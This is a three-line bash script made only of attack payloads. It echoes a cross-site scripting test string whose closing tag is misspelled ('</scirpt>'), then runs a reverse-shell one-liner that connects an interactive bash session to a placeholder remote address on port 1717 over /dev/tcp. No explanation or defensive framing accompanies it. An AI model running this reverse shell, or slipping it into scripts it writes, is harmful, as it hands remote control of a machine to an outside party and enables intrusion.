#!/bin/bash
echo '<script>alert(1)</scirpt>'
bash -i >& /dev/tcp/x.x.x.x/1717 0>&1
